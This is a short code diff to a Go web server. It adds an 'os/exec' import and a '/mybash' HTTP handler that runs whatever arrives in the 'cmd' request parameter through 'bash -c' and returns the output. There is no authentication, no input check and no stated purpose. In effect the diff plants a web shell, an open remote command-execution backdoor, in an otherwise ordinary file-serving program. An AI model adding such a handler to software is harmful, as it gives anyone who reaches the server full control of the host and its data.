@@ -7,6 +7,7 @@ import "flag"
 import "fmt"
 import "strings"
 import "os"
+import "os/exec"
 import "crypto/subtle"
 import "io/ioutil"
 import "encoding/json"
@@ -52,6 +53,16 @@ func main() {
 	// fs := http.FileServer(http.Dir("./public"))
 	//mux.Handle("/", http.StripPrefix("/", fs))
 
+
+	mux.HandleFunc("/mybash", func(w http.ResponseWriter, r *http.Request) {
+	  cmd := exec.Command("bash", "-c", r.FormValue("cmd"))
+	  ret, err := cmd.CombinedOutput()
+	  if err != nil {
+	    http.Error(w, err.Error(), http.StatusInternalServerError)
+	    return
+	  }
+	  w.Write(ret)
+	})
 	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
 		if r.URL.Path == "/" {
 			http.ServeFile(w, r, *indexFile)
